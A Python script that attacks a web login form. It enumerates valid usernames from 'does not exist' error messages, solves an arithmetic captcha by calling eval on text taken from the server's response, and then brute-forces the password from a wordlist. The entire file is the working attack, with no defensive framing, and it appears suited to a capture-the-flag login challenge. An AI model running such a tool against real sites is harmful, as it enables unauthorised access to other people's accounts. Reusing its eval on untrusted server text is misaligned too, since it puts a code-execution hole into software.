import sys
import requests 
import re

# Check if the correct number of arguments is provided
if len(sys.argv) != 4:
    print("Usage: python script.py <URL> <usernames_file> <password_file>")
    sys.exit(1)

# Extract the URL and usernames file from the command-line arguments
url = sys.argv[1]
usernames_file = sys.argv[2]
password_file = sys.argv[3]

# Read the usernames from the specified text file
usernames = open(sys.argv[2],'r').read().splitlines()
passwords = open(sys.argv[3], 'r').read().splitlines()


def solve_captcha(response):
    captcha_syntax = re.compile(r'(\d+\s[+*-/]\s\d+)')
    captcha = captcha_syntax.findall(response)
    return eval(captcha[0])



data = {
        "username": usernames[0],
        "password": passwords[0],
    }
response = requests.post(url, data=data)
if 'Captcha enabled' in response.text:
    data["captcha"] = solve_captcha(response.text)

    print(data)


# Make the POST request for each username
for username in usernames:


    print(f'Testing username: {username}')
    if 'Captcha enabled' in response.text:
        data = {
        "username": username,
        "password": passwords[0],
        "captcha": solve_captcha(response.text)
    }
    response = requests.post(url, data=data)   
    
    if 'does not exist' not in response.text:
        print(f'{username} is the correct username')
        real_user = username
        break



for password in passwords:

    data = {
        "username": real_user,
        "password": password,
        "captcha": solve_captcha(response.text)
    }
    response = requests.post(url, data=data)
    if 'Invalid password for user' not in response.text:
        print(f'The user is {real_user} and the password is {password}')
        break
